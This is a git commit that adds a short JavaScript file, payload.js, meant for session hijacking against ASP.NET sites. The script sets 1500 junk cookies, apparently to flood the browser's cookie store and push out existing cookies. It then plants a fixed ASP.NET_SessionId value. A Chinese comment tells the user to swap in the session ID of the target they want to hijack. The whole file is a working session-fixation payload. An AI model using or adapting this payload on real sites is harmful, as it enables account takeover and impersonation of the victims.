acf603b1a0a22e70e7216dc5ddc3a54b35c53b32
0xpk <136787670+H4ck3rxPK@users.noreply.github.com>
2026-03-06 12:04:38 +0800

    test
    Add payload.js to set multiple cookies and a target Session ID

---
+++ payload.js
@@ -0,0 +1,6 @@
+// payload.js
+for(let i=1500;i--;) {
+    document.cookie = `c${i}=${i};path=/`;
+}
+// 把下面的值換成你想要劫持的目標 Session ID
+document.cookie = 'ASP.NET_SessionId=3wcidffzmp1wafu0uefvcuhw;path=/';
